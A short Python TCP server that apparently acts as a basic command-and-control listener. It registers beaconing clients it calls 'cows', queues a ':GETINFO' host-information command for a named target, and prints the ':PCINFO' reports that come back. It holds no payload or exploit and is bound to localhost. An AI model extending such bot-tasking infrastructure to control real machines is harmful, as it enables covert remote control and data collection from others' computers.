import socket

ip = '127.0.0.1'
port = 4570

DeviceIDList = []
DeviceIPList = []
pending_command = {}

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((ip, port))
server_socket.listen(5)

print(f"[+] Server listening on {ip}:{port}")

while True:
    client_socket, address = server_socket.accept()
    msg = client_socket.recv(4096).decode()
    print(f"\n[>] Received:\n{msg}")

    lines = msg.splitlines()

    if msg.startswith(":CLIENTPING"):
        name = lines[1]
        ip_addr = lines[2]

        if name not in DeviceIDList:
            DeviceIDList.append(name)
            DeviceIPList.append(ip_addr)
            print(f"[+] New cow: {name} at {ip_addr}")

        if pending_command.get(name):
            command = pending_command.pop(name)
            client_socket.send(command.encode())
        else:
            client_socket.send(b":NOOP")  # No operation

    elif msg.startswith(":PCINFO"):
        print("[+] Received PCINFO:")
        print("\n".join(lines[1:]))

    elif msg.startswith(":GETINFO"):
        lines = msg.splitlines()
        target = lines[1]
        pending_command[target] = ":COMMAND :GETINFO"
        print(f"[+] Queued :GETINFO for {target}")

    #elif msg.startswith(":LISTCOWS"):

    client_socket.close()
